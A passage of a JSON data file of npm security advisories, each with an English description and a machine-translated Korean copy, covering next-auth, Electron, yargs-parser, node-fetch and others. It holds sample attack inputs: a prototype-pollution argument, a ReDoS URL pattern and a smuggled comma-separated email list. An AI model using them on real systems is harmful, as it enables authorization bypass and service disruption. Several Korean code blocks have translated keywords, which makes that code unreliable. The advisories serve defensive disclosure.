https://next-auth.js.org/configuration/options#logger\n- https://next-auth.js.org/getting-started/upgrade-v4\n\n### 자세한 내용은\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n이 문제는 7월 18일에 보고되었고 20분도 안 되어 응답이 발송되었으며 문제를 식별한 후 일주일 이내에 패치가 게시되었습니다."
  },
  {
    "description": "### Impact\nAn information disclosure vulnerability in `next-auth` before `v4.10.2` and `v3.29.9` allows an attacker with log access privilege to obtain excessive information such as an identity provider's secret in the log (which is thrown during OAuth error handling) and use it to leverage further attacks on the system, like impersonating the client to ask for extensive permissions.\n\n### Patches\nWe patched this vulnerability in `v4.10.2` and `v3.29.9` by moving the log for `provider` information to the debug level. In addition, we added a warning for having the `debug: true` option turned on in production and documented it [here](https://next-auth.js.org/warnings#debug_enabled).\n> You have enabled the debug option. It is meant for development only, to help you catch issues in your authentication flow and you should consider removing this option when deploying to production. One way of only allowing debugging while not in production is to set debug: process.env.NODE_ENV !== \"production\", so you can commit this without needing to change the value.\n> \n> If you want to log debug messages during production anyway, we recommend setting the [logger option](https://next-auth.js.org/configuration/options#logger) with proper sanitization of potentially sensitive user information.\n\nTo upgrade:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n# or\npnpm add next-auth@latest\n```\n(This will update to the latest v4 version, but you can change `latest` to 3 if you want to stay on v3. This is not recommended. v3 is unmaintained.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, you can user the `logger` configuration option by sanitizing the logs:\n```ts\n// Example\nimport log from \"your-logging-service\"\nexport const authOptions: NextAuthOptions = {\n  debug: process.env.NODE_ENV !== \"production\",\n  logger: {\n    error: (code, metadata) => {\n      if (!(metadata instanceof Error) &&  metadata.provider) {\n        // redact the provider secret here\n        delete metadata.provider\n        log.error(code, metadata)\n      } else {\n        log.error(code, metadata)\n      }\n    }\n  },\n}\n```\n\n### References\nRelated documentation:\n- https://next-auth.js.org/warnings#debug_enabled\n- https://next-auth.js.org/configuration/options#logger \n- https://next-auth.js.org/getting-started/upgrade-v4\n\n### For more information\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\nThe issue was reported 18th of July, a response was sent out in less than 20 minutes and after identifying the issue a patch was published within a week.",
    "identifiers": "GHSA : GHSA-p6mm-27gq-9v3p\nCVE : CVE-2022-31186",
    "severity": "LOW",
    "updatedAt": "2023-01-27T05:07:15Z",
    "publishedAt": "2022-08-06T05:29:45Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-p6mm-27gq-9v3p\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31186\nhttps://next-auth.js.org/configuration/options#logger\nhttps://next-auth.js.org/getting-started/upgrade-v4\nhttps://next-auth.js.org/warnings#debug_enabled\nhttps://github.com/advisories/GHSA-p6mm-27gq-9v3p",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.29.9",
    "identifier": "3.29.9",
    "descriptionKR": "### 영향\n`v4.10.2` 및 `v3.29.9` 이전 `next-auth`의 정보 공개 취약성으로 인해 로그 액세스 권한이 있는 공격자가 로그에서 ID 공급자의 비밀과 같은 과도한 정보를 얻을 수 있습니다(OAuth 오류 처리 중에 발생함). ) 광범위한 권한을 요청하기 위해 클라이언트를 가장하는 것과 같이 시스템에 대한 추가 공격을 활용하는 데 사용합니다.\n\n### 패치\n`provider` 정보에 대한 로그를 디버그 수준으로 이동하여 `v4.10.2` 및 `v3.29.9`에서 이 취약점을 패치했습니다. 또한 프로덕션에서 `debug: true` 옵션을 켜는 것에 대한 경고를 추가하고 [여기](https://next-auth.js.org/warnings#debug_enabled)에 문서화했습니다.\n> 디버그 옵션을 활성화했습니다. 이는 인증 흐름에서 문제를 파악하는 데 도움이 되는 개발 전용이며 프로덕션에 배포할 때 이 옵션을 제거하는 것을 고려해야 합니다. 생산 중이 아닌 동안에만 디버깅을 허용하는 한 가지 방법은 debug: process.env.NODE_ENV !== \"production\"을 설정하는 것이므로 값을 변경할 필요 없이 이를 커밋할 수 있습니다.\n>\n> 어쨌든 프로덕션 중에 디버그 메시지를 기록하려면 [로거 옵션](https://next-auth.js.org/configuration/options#logger)을 잠재적으로 민감한 사용자 정보를 적절하게 삭제하도록 설정하는 것이 좋습니다.\n\n업그레이드하려면:\n\n```쉬\nnpm i next-auth@latest\n# 또는\n원사 추가 next-auth@latest\n# 또는\npnpm add next-auth@latest\n```\n(최신 v4 버전으로 업데이트되지만 v3을 유지하려면 `latest`를 3으로 변경할 수 있습니다. 권장하지 않습니다. v3는 유지 관리되지 않습니다.)\n\n### 해결 방법\n\n어떤 이유로 업그레이드할 수 없는 경우 로그를 삭제하여 `logger` 구성 옵션을 사용할 수 있습니다.\n```ts\n// 예\n\"your-logging-service\"에서 로그 가져오기\n내보내기 const authOptions: NextAuthOptions = {\n  디버그: process.env.NODE_ENV !== \"프로덕션\",\n  로거: {\n    오류: (코드, 메타데이터) => {\n      if (!(metadata instanceof Error) && metadata.provider) {\n        // 여기에서 제공자 비밀을 수정합니다.\n        메타데이터 삭제.제공자\n        log.error(코드, 메타데이터)\n      } 또 다른 {\n        log.error(코드, 메타데이터)\n      }\n    }\n  },\n}\n```\n\n### 참조\n관련 문서:\n- https://next-auth.js.org/warnings#debug_enabled\n- https://next-auth.js.org/configuration/options#logger\n- https://next-auth.js.org/getting-started/upgrade-v4\n\n### 자세한 내용은\n우려 사항이 있는 경우 https://next-auth.js.org/security#reporting-a-vulnerability에 설명된 책임 있는 공개를 요청합니다.\n\n### 타임라인\n이 문제는 7월 18일에 보고되었고 20분도 안 되어 응답이 발송되었으며 문제를 식별한 후 일주일 이내에 패치가 게시되었습니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of the deprecated package google-cloudstorage-commands.",
    "identifiers": "GHSA : GHSA-6367-p3v8-7mgw\nCVE : CVE-2020-28436",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:19Z",
    "publishedAt": "2022-07-26T00:01:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28436\nhttps://github.com/samradical/google-cloudstorage-commands/blob/master/index.js%23L11\nhttps://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431\nhttps://github.com/advisories/GHSA-6367-p3v8-7mgw",
    "name": "google-cloudstorage-commands",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.1",
    "descriptionKR": "명령 삽입 취약성은 지원 중단된 패키지 google-cloudstorage-commands의 모든 버전에 영향을 미칩니다."
  },
  {
    "description": "All versions of package git-archive are vulnerable to Command Injection via the exports function.",
    "identifiers": "GHSA : GHSA-vqgr-mfxm-47f3\nCVE : CVE-2020-28422",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:07:26Z",
    "publishedAt": "2022-07-26T00:01:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28422\nhttps://security.snyk.io/vuln/SNYK-JS-GITARCHIVE-1050391\nhttps://github.com/advisories/GHSA-vqgr-mfxm-47f3",
    "name": "git-archive",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.4",
    "descriptionKR": "패키지 git-archive의 모든 버전은 내보내기 기능을 통한 명령 주입에 취약합니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package deferred-exec. The injection point is located in line 42 in lib/deferred-exec.js",
    "identifiers": "GHSA : GHSA-54w4-2f2p-f48h\nCVE : CVE-2020-28438",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:49Z",
    "publishedAt": "2022-07-26T00:01:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28438\nhttps://security.snyk.io/vuln/SNYK-JS-DEFERREDEXEC-1050433\nhttps://github.com/danheberden/deferred-exec/blob/master/lib/deferred-exec.js#L42\nhttps://github.com/advisories/GHSA-54w4-2f2p-f48h",
    "name": "deferred-exec",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.3.1",
    "descriptionKR": "명령 삽입 취약점은 deferred-exec 패키지의 모든 버전에 영향을 미칩니다. 주입 지점은 lib/deferred-exec.js의 42번째 줄에 있습니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package sonar-wrapper. The injection point is located in lib/sonarRunner.js.",
    "identifiers": "GHSA : GHSA-wr4v-3f2h-6hhh\nCVE : CVE-2020-28443",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:38Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28443\nhttps://security.snyk.io/vuln/SNYK-JS-SONARWRAPPER-1050980\nhttps://github.com/llooiicc/sonar-wrapper/blob/master/lib/sonarRunner.js\nhttps://github.com/advisories/GHSA-wr4v-3f2h-6hhh",
    "name": "sonar-wrapper",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.3",
    "descriptionKR": "명령 주입 취약점은 sonar-wrapper 패키지의 모든 버전에 영향을 미칩니다. 주입 지점은 lib/sonarRunner.js에 있습니다."
  },
  {
    "description": "This affects the package conf-cfg-ini before 1.2.2. If an attacker submits a malicious INI file to an application that parses it with decode, they will pollute the prototype on the application. This can be exploited further depending on the context.",
    "identifiers": "GHSA : GHSA-m6mg-jvjf-w44x\nCVE : CVE-2020-28441",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:20Z",
    "publishedAt": "2022-07-26T00:01:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28441\nhttps://github.com/loge5/conf-cfg-ini/commit/3a88a6c52c31eb6c0f033369eed40aa168a636ea\nhttps://security.snyk.io/vuln/SNYK-JS-CONFCFGINI-1048973\nhttps://github.com/loge5/conf-cfg-ini/commit/ecd878f8f7398e765739e989c7fe7cc052308947\nhttps://github.com/advisories/GHSA-m6mg-jvjf-w44x",
    "name": "conf-cfg-ini",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.2",
    "identifier": "1.2.2",
    "descriptionKR": "이것은 1.2.2 이전의 패키지 conf-cfg-ini에 영향을 미칩니다. 공격자가 악성 INI 파일을 디코딩으로 구문 분석하는 응용 프로그램에 제출하면 응용 프로그램의 프로토타입을 오염시킵니다. 이는 상황에 따라 추가로 악용될 수 있습니다."
  },
  {
    "description": "[node-fetch](https://www.npmjs.com/package/node-fetch) is a light-weight module that brings window.fetch to node.js.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `isOriginPotentiallyTrustworthy()` function in `referrer.js`, when processing a URL string with alternating letters and periods, such as `'http://' + 'a.a.'.repeat(i) + 'a'`.",
    "identifiers": "GHSA : GHSA-vp56-6g26-6827\nCVE : CVE-2022-2596",
    "severity": "MODERATE",
    "updatedAt": "2023-07-11T13:42:39Z",
    "publishedAt": "2022-08-02T00:00:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2596\nhttps://github.com/node-fetch/node-fetch/commit/28802387292baee467e042e168d92597b5bbbe3d\nhttps://huntr.dev/bounties/a7e6a136-0a4b-46c4-ad20-802f1dd60bf7\nhttps://github.com/node-fetch/node-fetch/pull/1611\nhttps://github.com/node-fetch/node-fetch/releases/tag/v3.2.10\nhttps://github.com/advisories/GHSA-vp56-6g26-6827",
    "name": "node-fetch",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.2.10",
    "identifier": "3.2.10",
    "descriptionKR": "[node-fetch](https://www.npmjs.com/package/node-fetch)는 window.fetch를 node.js로 가져오는 경량 모듈입니다.\n\n이 패키지의 영향을 받는 버전은 `http://와 같이 대체 문자와 마침표가 있는 URL 문자열을 처리할 때 `referrer.js`의 `isOriginPotentiallyTrustworthy()` 함수에서 ReDoS(Regular Expression Denial of Service)에 취약합니다. ' + 'a.a.'.repeat(i) + 'a'`."
  },
  {
    "description": "Cross-site scripting (XSS) vulnerability in the DataTables plugin 1.10.8 and earlier for jQuery allows remote attackers to inject arbitrary web script or HTML via the scripts parameter to media/unit_testing/templates/6776.php.\n\n\n## Recommendation\n\nUpdate to a version greater than 1.10.8. A [fix](https://github.com/DataTables/DataTablesSrc/commit/ccf86dc5982bd8e16d) appears in [version 1.10.10](https://github.com/DataTables/DataTablesSrc/commits/1.10.10?after=9780a3693572757d87bf70e48bd7555faf974f28+34&branch=1.10.10&qualified_name=refs%2Ftags%2F1.10.10).",
    "identifiers": "GHSA : GHSA-4mv4-gmmf-q382\nCVE : CVE-2015-6584",
    "severity": "HIGH",
    "updatedAt": "2023-01-11T05:08:25Z",
    "publishedAt": "2020-08-31T22:42:29Z",
    "references": "https://github.com/DataTables/DataTables/issues/602\nhttps://github.com/DataTables/DataTablesSrc/commit/ccf86dc5982bd8e16d\nhttps://www.netsparker.com/cve-2015-6384-xss-vulnerability-identified-in-datatables/\nhttps://www.npmjs.com/advisories/5\nhttp://www.securityfocus.com/archive/1/archive/1/536437/100/0/threaded\nhttps://nvd.nist.gov/vuln/detail/CVE-2015-6584\nhttp://packetstormsecurity.com/files/133555/DataTables-1.10.8-Cross-Site-Scripting.html\nhttp://seclists.org/fulldisclosure/2015/Sep/37\nhttp://www.securityfocus.com/archive/1/536437/100/0/threaded\nhttps://github.com/DataTables/DataTablesSrc/commits/1.10.10?after=9780a3693572757d87bf70e48bd7555faf974f28+34&branch=1.10.10&qualified_name=refs%2Ftags%2F1.10.10\nhttps://github.com/advisories/GHSA-4mv4-gmmf-q382",
    "name": "datatables",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.10.10",
    "identifier": "1.10.10",
    "descriptionKR": "jQuery용 DataTables 플러그인 1.10.8 및 이전 버전의 XSS(교차 사이트 스크립팅) 취약성으로 인해 원격 공격자가 scripts 매개 변수를 통해 임의의 웹 스크립트 또는 HTML을 media/unit_testing/templates/6776.php에 주입할 수 있습니다.\n\n\n## 추천\n\n1.10.8보다 높은 버전으로 업데이트하십시오. [수정](https://github.com/DataTables/DataTablesSrc/commit/ccf86dc5982bd8e16d)이 [버전 1.10.10](https://github.com/DataTables/DataTablesSrc/commits/1.10.10?after= 9780a3693572757d87bf70e48bd7555faf974f28+34&branch=1.10.10&qualified_name=refs%2Ftags%2F1.10.10)."
  },
  {
    "description": "Versions of `selenium-binaries` prior to 0.15.0 insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `selenium-binaries`.\n\n\n## Recommendation\n\nA fix for this vulnerability is available on the `master` branch of the repository as part of version 0.15.0.\n\nAnother mitigation currently available is to use an alternate package, such as [selenium-webdriver](https://www.npmjs.com/package/selenium-webdriver), the official selenium bindings for node.js. ",
    "identifiers": "GHSA : GHSA-h4mc-r4f4-hcf4\nCVE : CVE-2016-10589",
    "severity": "HIGH",
    "updatedAt": "2023-01-11T05:08:04Z",
    "publishedAt": "2019-02-18T23:34:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-10589\nhttps://www.npmjs.com/advisories/175\nhttps://github.com/spunjs/selenium-binaries/pull/33\nhttps://github.com/spunjs/selenium-binaries/commit/be37e82a3c43a4f1679d66cf9467085ec9994c47\nhttps://www.huntr.dev/bounties/1-npm-selenium-binaries/\nhttps://github.com/advisories/GHSA-h4mc-r4f4-hcf4",
    "name": "selenium-binaries",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.15.0",
    "identifier": "0.15.0",
    "descriptionKR": "0.15.0 이전의 `selenium-binaries` 버전은 암호화되지 않은 HTTP 연결을 통해 실행 파일을 안전하지 않게 다운로드합니다.\n\n공격자가 네트워크에서 권한 있는 위치에 있는 시나리오에서는 응답을 가로채고 실행 파일을 악의적인 것으로 대체하여 'selenium-binaries'를 실행하는 시스템에서 코드를 실행할 수 있습니다.\n\n\n## 추천\n\n이 취약점에 대한 수정 사항은 버전 0.15.0의 일부로 리포지토리의 '마스터' 분기에서 사용할 수 있습니다.\n\n현재 사용 가능한 또 다른 완화 방법은 node.js의 공식 셀레늄 바인딩인 [selenium-webdriver](https://www.npmjs.com/package/selenium-webdriver)와 같은 대체 패키지를 사용하는 것입니다."
  },
  {
    "description": "Versions of `mysql` before 2.14.0 are vulnerable to remove memory exposure.\n\nAffected versions of `mysql` package allocate and send an uninitialized memory over the network when a number is provided as a password.\n\nOnly `mysql` running on Node.js versions below 6.0.0 are affected due to a throw added in newer node.js versions.\n\nProof of Concept:\n\n```\nrequire('mysql').createConnection({\n  host: 'localhost',\n  user: 'user',\n  password : USERPROVIDEDINPUT,  // number\n  database : 'my_db'\n}).connect();\n```\n\n\n\n## Recommendation\n\nUpdate to version 2.14.0 or later.",
    "identifiers": "GHSA : GHSA-5f7m-mmpc-qhh4",
    "severity": "MODERATE",
    "updatedAt": "2023-01-11T05:08:06Z",
    "publishedAt": "2019-05-23T09:27:00Z",
    "references": "https://github.com/mysqljs/mysql/commit/310c6a7d1b2e14b63b572dbfbfa10128f20c6d52\nhttps://www.npmjs.com/advisories/602\nhttps://github.com/mysqljs/mysql/commit/192fe45593ba5768534afb6f2154432ca67a5002\nhttps://github.com/advisories/GHSA-5f7m-mmpc-qhh4",
    "name": "mysql",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0-alpha8, < 2.14.0",
    "identifier": "2.14.0",
    "descriptionKR": "2.14.0 이전 버전의 `mysql`은 메모리 노출 제거에 취약합니다.\n\n영향을 받는 `mysql` 패키지 버전은 숫자가 비밀번호로 제공되면 네트워크를 통해 초기화되지 않은 메모리를 할당하고 보냅니다.\n\n6.0.0 미만의 Node.js 버전에서 실행되는 `mysql`만 최신 node.js 버전에 추가된 throw로 인해 영향을 받습니다.\n\n개념의 증거:\n\n```\nrequire('mysql').createConnection({\n  호스트: 'localhost',\n  사용자: '사용자',\n  비밀번호 : USERPROVIDEDINPUT, // 숫자\n  데이터베이스 : 'my_db'\n}).연결하다();\n```\n\n\n\n## 추천\n\n버전 2.14.0 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `metascraper` prior to 5.2.0 are vulnerable to stored cross-site scripting (XSS).\n\n\n## Recommendation\n\nUpgrade to version 5.2.0 or later.",
    "identifiers": "GHSA : GHSA-8f64-q7jc-ccgp\nCVE : CVE-2018-3773",
    "severity": "MODERATE",
    "updatedAt": "2023-01-31T01:53:20Z",
    "publishedAt": "2018-08-08T22:25:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-3773\nhttps://hackerone.com/reports/309367\nhttps://www.npmjs.com/advisories/603\nhttps://github.com/microlinkhq/metascraper/pull/169\nhttps://github.com/advisories/GHSA-8f64-q7jc-ccgp",
    "name": "metascraper",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.2.0",
    "identifier": "5.2.0",
    "descriptionKR": "5.2.0 이전 버전의 'metascraper'는 저장된 XSS(교차 사이트 스크립팅)에 취약합니다.\n\n\n## 추천\n\n버전 5.2.0 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `ircdkit` 1.0.3 and prior are vulnerable to a remote denial of service.\n\n\n## Recommendation\n\nUpgrade to version 1.0.4.",
    "identifiers": "GHSA : GHSA-f7r3-p866-q9qr",
    "severity": "LOW",
    "updatedAt": "2023-01-11T05:08:06Z",
    "publishedAt": "2019-06-03T17:27:49Z",
    "references": "https://github.com/Twipped/ircdkit/issues/1\nhttps://github.com/Twipped/ircdkit/commit/f0cc6dc913ec17b499fa33a676bb72c624456f2c\nhttps://www.npmjs.com/advisories/735\nhttps://snyk.io/vuln/SNYK-JS-IRCDKIT-173688\nhttps://github.com/Twipped/ircdkit/pull/2/commits/595ed02cde517fad57854d2ac2855a09a626e665\nhttps://github.com/advisories/GHSA-f7r3-p866-q9qr",
    "name": "ircdkit",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.3",
    "identifier": "1.0.4",
    "descriptionKR": "`ircdkit` 1.0.3 이전 버전은 원격 서비스 거부에 취약합니다.\n\n\n## 추천\n\n버전 1.0.4로 업그레이드하십시오."
  },
  {
    "description": "The package ntesseract before 0.2.9 is vulnerable to Command Injection via lib/tesseract.js.",
    "identifiers": "GHSA : GHSA-w868-4576-rv24\nCVE : CVE-2020-28446",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:06Z",
    "publishedAt": "2022-07-26T00:01:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28446\nhttps://github.com/taoyuan/ntesseract/commit/fcbc36f381798b4362179c0cdf9961b437c7b619\nhttps://security.snyk.io/vuln/SNYK-JS-NTESSERACT-1050982\nhttps://github.com/advisories/GHSA-w868-4576-rv24",
    "name": "ntesseract",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.9",
    "identifier": "0.2.9",
    "descriptionKR": "0.2.9 이전 패키지 ntesseract는 lib/tesseract.js를 통한 명령 주입에 취약합니다."
  },
  {
    "description": "Affected versions of `yargs-parser` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--foo.__proto__.bar baz'` adds a `bar` property with value `baz` to all objects. This is only exploitable if attackers have control over the arguments being passed to `yargs-parser`.\n\n\n\n## Recommendation\n\nUpgrade to versions 13.1.2, 15.0.1, 18.1.1 or later.",
    "identifiers": "GHSA : GHSA-p9pc-299p-vxgp\nCVE : CVE-2020-7608",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:00:51Z",
    "publishedAt": "2020-09-04T18:00:54Z",
    "references": "https://snyk.io/vuln/SNYK-JS-YARGSPARSER-560381\nhttps://www.npmjs.com/advisories/1500\nhttps://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-7608\nhttps://github.com/yargs/yargs-parser/commit/1c417bd0b42b09c475ee881e36d292af4fa2cc36\nhttps://github.com/advisories/GHSA-p9pc-299p-vxgp",
    "name": "yargs-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 16.0.0, < 18.1.1",
    "identifier": "18.1.1",
    "descriptionKR": "영향을 받는 `yargs-parser` 버전은 프로토타입 오염에 취약합니다. 인수가 제대로 정리되지 않아 공격자가 '객체'의 프로토타입을 수정하여 모든 객체에 존재할 기존 속성을 추가하거나 수정할 수 있습니다.\n`--foo.__proto__.bar baz'` 인수를 구문 분석하면 값이 `baz`인 `bar` 속성이 모든 개체에 추가됩니다. 이는 공격자가 `yargs-parser`로 전달되는 인수를 제어할 수 있는 경우에만 악용될 수 있습니다.\n\n\n\n## 추천\n\n버전 13.1.2, 15.0.1, 18.1.1 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of electron \nA vulnerability has been discovered which allows Node.js integration to be re-enabled in some Electron applications that disable it.\n\nFor the application to be impacted by this vulnerability it must meet all of these conditions\n\n- Runs on Electron 1.7, 1.8, or a 2.0.0-beta\n- Allows execution of arbitrary remote code\n- Disables Node.js integration\n- Does not explicitly declare webviewTag: false in its webPreferences\n- Does not enable the nativeWindowOption option\n- Does not intercept new-window events and manually override event.newGuest without using the supplied options tag\n\n\n## Recommendation\n\nUpdate to `electron` version 1.7.13, 1.8.4, or 2.0.0-beta.5 or later.\n\nIf you are unable to update your Electron version can mitigate the vulnerability with the following code.\n\n```\napp.on('web-contents-created', (event, win) => {\n  win.on('new-window', (event, newURL, frameName, disposition,\n                        options, additionalFeatures) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = false;\n    options.webPreferences.nodeIntegrationInWorker = false;\n    options.webPreferences.webviewTag = false;\n    delete options.webPreferences.preload;\n  })\n})\n\n// and *IF* you don't use WebViews at all,\n// you might also want\napp.on('web-contents-created', (event, win) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```",
    "identifiers": "GHSA : GHSA-8xwg-wv7v-4vqp\nCVE : CVE-2018-1000136",
    "severity": "HIGH",
    "updatedAt": "2023-03-31T18:21:31Z",
    "publishedAt": "2018-03-26T16:41:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000136\nhttps://electronjs.org/blog/webview-fix\nhttps://www.npmjs.com/advisories/574\nhttps://www.electronjs.org/blog/webview-fix\nhttps://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-1000136---Electron-nodeIntegration-Bypass/\nhttps://github.com/electron/electron/pull/12271\nhttps://github.com/electron/electron/pull/12292\nhttps://github.com/electron/electron/pull/12294\nhttps://github.com/electron/electron/commit/1a48ee28276e6588dbf4e70e58d78e7bfdc57043\nhttps://github.com/advisories/GHSA-8xwg-wv7v-4vqp",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0-beta.1, < 2.0.0-beta.5",
    "identifier": "2.0.0-beta.5",
    "descriptionKR": "전자 버전\nNode.js 통합을 비활성화한 일부 Electron 애플리케이션에서 다시 활성화할 수 있는 취약점이 발견되었습니다.\n\n응용 프로그램이 이 취약점의 영향을 받으려면 다음 조건을 모두 충족해야 합니다.\n\n- Electron 1.7, 1.8 또는 2.0.0-베타에서 실행\n- 임의의 원격 코드 실행 허용\n- Node.js 통합 비활성화\n- 명시적으로 webviewTag를 선언하지 않음: webPreferences에서 false\n- nativeWindowOption 옵션을 활성화하지 않습니다.\n- 새 창 이벤트를 가로채지 않고 제공된 옵션 태그를 사용하지 않고 수동으로 event.newGuest를 재정의합니다.\n\n\n## 추천\n\n`electron` 버전 1.7.13, 1.8.4 또는 2.0.0-beta.5 이상으로 업데이트하십시오.\n\nElectron 버전을 업데이트할 수 없는 경우 다음 코드를 사용하여 취약점을 완화할 수 있습니다.\n\n```\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('새 창', (이벤트, 새 URL, 프레임 이름, 배치,\n                        옵션, 추가 기능) => {\n    if (!options.webPreferences) options.webPreferences = {};\n    options.webPreferences.nodeIntegration = 거짓;\n    options.webPreferences.nodeIntegrationInWorker = 거짓;\n    options.webPreferences.webviewTag = 거짓;\n    삭제 options.webPreferences.preload;\n  })\n})\n\n// *IF* WebView를 전혀 사용하지 않는 경우,\n// 원할 수도 있습니다.\napp.on('웹 콘텐츠 생성', (이벤트, 당첨) => {\n  win.on('will-attach-webview', (event, webPreferences, params) => {\n    event.preventDefault();\n  })\n})\n```"
  },
  {
    "description": "GitHub Electron 1.7.15, 1.8.7, 2.0.7, and 3.0.0-beta.6, in certain scenarios involving IFRAME elements and \"nativeWindowOpen: true\" or \"sandbox: true\" options, is affected by a webPreferences vulnerability that can be leveraged to perform remote code execution.\n\nMore information to determine if you are impacted can be found on the [electron blog](https://electronjs.org/blog/web-preferences-fix).\n\n\n## Recommendation\n\nUpgrade Electron to >=3.0.0-beta.7, >=2.0.8, >=1.8.8, or >=1.7.16.",
    "identifiers": "GHSA : GHSA-hv9c-qwqg-qj3v\nCVE : CVE-2018-15685",
    "severity": "HIGH",
    "updatedAt": "2023-01-11T05:08:04Z",
    "publishedAt": "2018-08-23T19:12:08Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-15685\nhttps://electronjs.org/blog/web-preferences-fix\nhttps://www.contrastsecurity.com/security-influencers/cve-2018-15685\nhttps://www.npmjs.com/advisories/732\nhttps://www.exploit-db.com/exploits/45272/\nhttps://github.com/electron/electron/commit/519a02d8d4d28e8a467acb40fb26172a80c9454f\nhttps://github.com/electron/electron/commit/80221e52d93a96ea704cb6748ead669c55cff504\nhttps://github.com/electron/electron/commit/bab968ca776be28791e4dddfd50c86bd5fae62fa\nhttps://github.com/electron/electron/commit/ef0a6d9a1c96efc4657c6dd3a6624eba969f095b\nhttps://github.com/advisories/GHSA-hv9c-qwqg-qj3v",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0-beta.1, < 3.0.0-beta.7",
    "identifier": "3.0.0-beta.7",
    "descriptionKR": "GitHub Electron 1.7.15, 1.8.7, 2.0.7 및 3.0.0-beta.6은 IFRAME 요소 및 \"nativeWindowOpen: true\" 또는 \"sandbox: true\" 옵션과 관련된 특정 시나리오에서 다음과 같은 webPreferences 취약성의 영향을 받습니다. 원격 코드 실행을 수행하는 데 활용할 수 있습니다.\n\n영향을 받는지 확인하기 위한 자세한 정보는 [electron 블로그](https://electronjs.org/blog/web-preferences-fix)에서 확인할 수 있습니다.\n\n\n## 추천\n\nElectron을 >=3.0.0-beta.7, >=2.0.8, >=1.8.8 또는 >=1.7.16으로 업그레이드합니다."
  },
  {
    "description": "### Impact\n`next-auth` users who are using the `EmailProvider` either in versions before `4.10.3` or `3.29.10` are affected.\n\nIf an attacker could forge a request that sent a comma-separated list of emails (eg.: `attacker@attacker.com,victim@victim.com`) to the sign-in endpoint, NextAuth.js would send emails to both the attacker and the victim's e-mail addresses. The attacker could then login as a newly created user with the email being `attacker@attacker.com,victim@victim.com`. This means that basic authorization like `email.endsWith(\"@victim.com\")` in the `signIn` callback would fail to communicate a threat to the developer and would let the attacker bypass authorization, even with an `@attacker.com` address.\n\n### Patches\nWe patched this vulnerability in `v4.10.3` and `v3.29.10` by normalizing the email value that is sent to the sign-in endpoint before accessing it anywhere else. We also added a `normalizeIdentifier` callback on the `EmailProvider` configuration, where you can further tweak your requirements for what your system considers a valid e-mail address. (E.g.: strict RFC2821 compliance)\n\nTo upgrade, run one of the following:\n```sh\nnpm i next-auth@latest\n```\n```sh\nyarn add next-auth@latest\n```\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change `latest` to `3` if you want to stay on v3. This is not 